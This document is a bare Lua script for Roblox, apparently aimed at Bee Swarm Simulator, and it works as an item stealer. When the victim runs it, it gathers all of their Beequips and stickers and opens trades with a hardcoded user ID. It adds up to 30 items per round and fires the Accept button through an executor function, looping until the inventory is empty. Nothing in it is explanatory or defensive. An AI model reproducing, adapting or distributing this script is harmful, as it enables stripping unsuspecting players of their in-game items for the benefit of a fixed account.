local r=game:GetService("ReplicatedStorage")
local tg=require(r.Gui.TradeGui)
local evt=require(r.Events)
local tid=5452527151
local pg=game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local ce=require(r.Beequips.BeequipCaseEntry)
local bq,c,st,all,last,btn,ba,stk,cat

while true do
repeat task.wait(.3)until not tg.IsVisible()
task.wait(.5)
st=require(r.ClientStatCache):Get()
bq=st.Beequips
all={}
for _,e in ipairs(bq.Case)do
local f=ce.FromData(e):FetchBeequip(st)
if f then table.insert(all,{f=f,c="Beequip"})end
end
for _,v in ipairs(bq.Storage)do
table.insert(all,{f=v,c="Beequip"})
end
stk=st.Stickers and st.Stickers.Book or {}
for _,v in ipairs(stk)do
table.insert(all,{f=v,c="Sticker"})
end
if #all==0 then break end
evt.ClientCall("TradePlayerRequestStart",tid)
repeat task.wait(.3)until tg.IsVisible()
repeat task.wait(.3)local o=tg.GetMyOffer()until o and #o==0
last=nil
cat=nil
c=0
for i,v in ipairs(all)do
if i>30 then break end
repeat task.wait()until not tg.WaitingForServerResponse()
tg.AddToMyOffer({Pack={File=v.f,Category=v.c}})
last=v.f
cat=v.c
c=c+1
task.wait(.1)
end
if last then
repeat task.wait()until not tg.WaitingForServerResponse()
tg.RemoveFromMyOffer({Pack={File=last,Category=cat}})
task.wait(.2)
repeat task.wait()until not tg.WaitingForServerResponse()
tg.AddToMyOffer({Pack={File=last,Category=cat}})
task.wait(.2)
end
repeat task.wait()until not tg.WaitingForServerResponse()
repeat task.wait(.1)until tg.GetMyOffer() and #tg.GetMyOffer()>0
task.wait(.3)
btn=nil
ba=nil
repeat
task.wait(.1)
btn=pg:FindFirstChild("ScreenGui",true)or pg:FindFirstChild("TradeLayer",true)
if btn then btn=btn:FindFirstChild("TradeFrame",true)end
if btn then ba=btn:FindFirstChild("ButtonAccept",true)end
if ba then btn=ba:FindFirstChild("ButtonTop",true)end
until ba and ba.Visible and btn
firesignal(btn.MouseButton1Click)
task.wait(1)
end
